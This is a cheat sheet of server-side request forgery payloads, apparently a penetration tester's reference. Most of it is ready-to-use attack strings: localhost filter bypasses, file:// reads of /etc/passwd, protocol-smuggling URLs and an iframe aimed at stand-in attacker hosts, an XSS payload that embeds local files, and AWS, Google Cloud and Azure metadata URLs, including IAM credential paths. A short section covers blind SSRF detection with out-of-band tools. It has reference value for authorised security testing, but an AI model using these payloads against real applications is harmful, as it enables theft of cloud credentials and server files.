##### SSRF CHEATSHEET

--------------------------------------------------------------------     
Detection:
Check out parameters such as /file=, /path=, /src= to see if the application can send request only to whitelisted applications

Check out if there is PDF or any other file export tool in place which may be vulnerable to SSRF

````
__Basic localhost Payloads:__
1. http://127.0.0.1:port
2. http://localhost:port
3. https://127.0.0.1:port
4. https://localhost:port
5. http://[::]:port
6. http://0000::1:port
7. http://[0:0:0:0:0:ffff:127.0.0.1]
8. http://0/
9. http://127.1
10. http://127.0.1
````
````
__File path:__
/etc/passwd
1. file:///etc/passwd
2. file://path/to/file
3. file://\/\/etc/passwd
````
````
__With other protocols:__
1. sftp://attacker.com:port/
2. dict://attacker:port/
3. tftp://attacker.com:port/
4. ldap://localhost:port/
5. gopher://127.0.0.1:port/
````
````
__From XSS:__
\<img src="xxx" onerror="document.write('\<iframe src=file:///etc/passwd>\</iframe>')"/>\
\<link rel=attachment href="file:///etc/passwd">\
````
````
__With iframe injection:__
<?php $file = $_GET['file']; header("location:file://$file");?>
\<iframe src="http://attacker-ip/test.php?file=/etc/passwd">\</iframe>\
````
````
__AWS:__
1. http://instance-data
2. http://169.254.169.254
3. http://169.254.169.254/latest/user-data
4. http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
5. http://169.254.169.254/latest/meta-data/
6. http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
7. http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
8. http://169.254.169.254/latest/meta-data/ami-id
9. http://169.254.169.254/latest/meta-data/reservation-id
10. http://169.254.169.254/latest/meta-data/hostname
11. http://169.254.169.254/latest/meta-data/public-keys/
12. http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
13. http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
14. http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
15. http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
16. http://169.254.169.254/latest/dynamic/instance-identity/document
````
````
__Google Cloud:__
1. http://169.254.169.254/computeMetadata/v1/
2. http://metadata.google.internal/computeMetadata/v1/
3. http://metadata/computeMetadata/v1/
4. http://metadata.google.internal/computeMetadata/v1/instance/hostname
5. http://metadata.google.internal/computeMetadata/v1/instance/id
6. http://metadata.google.internal/computeMetadata/v1/project/project-id
````
````
Azure:
1. http://169.254.169.254/metadata/v1/maintenance
2. http://169.254.169.254/metadata/instance?api-version=2017-04-02
3. http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text

````


##### Blind SSRF vulnerabilities
````
Blind SSRF vulnerabilities arise when an application can be induced to issue a back-end HTTP request to a supplied URL,
but the response from the back-end request is not returned in the application's front-end response.

The most reliable way to detect blind SSRF vulnerabilities is using out-of-band (OAST) techniques.

This involves attempting to trigger an HTTP request to an external system that you control,and monitoring for 
network interactions with that system.The easiest and most effective way to use out-of-band techniques is using Burp Collaborator. 


Simply intercept the requied request and feed it to the intruder then copy the urp collaborator client and paste 
 it inthe referer header then go to your collaborator client and eatch all the DNS & HTTP requests comming in.

Blind SSRF can also be achieved by **SHELLSHOCK VULNERABILITY** 
````

#### References:-
````
https://portswigger.net/web-security/ssrf/blind
https://cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf
https://hdivsecurity.com/bornsecure/ssrf-what-is-server-side-request-forgery/
````
